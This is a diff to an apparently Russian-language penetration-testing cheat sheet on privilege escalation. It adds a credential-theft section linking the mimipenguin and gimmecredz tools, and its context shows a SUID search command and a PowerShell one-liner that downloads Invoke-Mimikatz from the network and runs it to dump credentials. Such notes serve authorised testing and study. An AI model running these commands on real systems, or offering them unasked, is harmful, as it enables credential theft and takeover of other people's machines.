@@ -239,6 +239,13 @@ SUID: find / -perm -u=s -type f 2>/dev/null
 6. Повышение привилегий через подмену DLL библиотек (DLL Hijacking)
 7. Повышение привилегий через неэкранированные пути сервисов (Unquoted Service Paths)
 
+### Получение паролей
+- [ ] mimipenguin https://github.com/huntergregal/mimipenguin.git 
+- [ ] gimmecredz https://github.com/0xmitsurugi/gimmecredz
+
+
+
+
 ### Mimikatz
 ```
 powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"
